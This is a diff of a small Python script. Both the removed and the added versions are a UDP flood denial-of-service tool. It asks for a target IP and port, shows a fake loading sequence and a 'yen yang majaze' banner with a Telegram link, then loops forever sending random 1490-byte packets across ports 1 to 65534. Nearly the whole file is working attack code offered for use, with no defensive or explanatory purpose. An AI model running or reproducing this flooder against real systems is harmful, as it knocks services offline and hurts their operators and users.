@@ -1,46 +1,57 @@
+import sys
 import os
 import time
 import socket
-from colorama import Fore
-os.system("clear") 
-print("iran Anonymos")
-time.sleep(5)
-red='\033[31m'
-green='\033[32m'
-os.system("clear")
-os.system("toilet -f mono12 -F gay iran hacker")
+import random
+#Code Time
+from datetime import datetime
+now = datetime.now()
+hour = now.hour
+minute = now.minute
+day = now.day
+month = now.month
+year = now.year
 
-print("iranAnonymos tem my name  :  yen yang majaze              ip your target")
-time.sleep(3)
-target = input(f"{green} : ")
-target.replace("http://", "")
-target.replace("https://","")
-target.replace("www.","")
-ip = socket.gethostbyname(target)
-port = 80
-joker = "DDOSjsjsjjdjdjdjdjjjjjjjjjiiiiiiiopppkkkkjjjjjhhhbbbbgbvvvvvvvvvvvvhhygggghhhhhhhhh"
+##############
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+bytes = random._urandom(1490)
+#############
+
 os.system("clear")
-os.system("toilet -f mono12 -F gay iran loading... ")
-print(Fore.YELLOW+"chek{.......... }5%")
+os.system("figlet yen yang mjaze")
+print
+print "script a yen yang mjaze"
+print "my telegram  :   https://t.me/yenyangmajaze"
+print
+ip = raw_input("what a ip : ")
+port = input("what a port : ")
+
+os.system("clear")
+os.system("figlet yen yang mjaze")
+print("chek{.......... }5%")
 time.sleep(1)
 os.system("clear") 
-print(Fore.GREEN+"Security{yen yang... }10%")
+print("Security{yen yang... }10%")
 time.sleep(2)
 os.system("clear") 
-print(Fore.WHITE+"Loading{yen yang majaze}40%")
+print("Loading{yen yang majaze}40%")
 time.sleep(3)
 os.system("clear") 
-print(Fore.BLUE+"amade saze{yen yang majaze..}90%")
+print("amade saze{yen yang majaze..}90%")
 time.sleep(3)
 os.system("clear") 
-print(Fore.GREEN+"goooooooooo{.............................. 100%")
+print("goooooooooo{.............................. 100%")
 time.sleep(4)
 os.system("clear") 
-print(Fore.RED+"please wait")
+print("please wait")
 time.sleep(6)
 os.system("clear")
-os.system("figlet Attack_Starting")
+sent = 0
 while True:
-     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-     sock.sendto(bytes(joker,"UTF-8"), (ip,port))
-     print(port," packet to site ",ip)
+     sock.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "paket%s DDOS your site %s or port is:%s"%(sent,ip,port)
+     if port == 65534:
+       port = 1
+
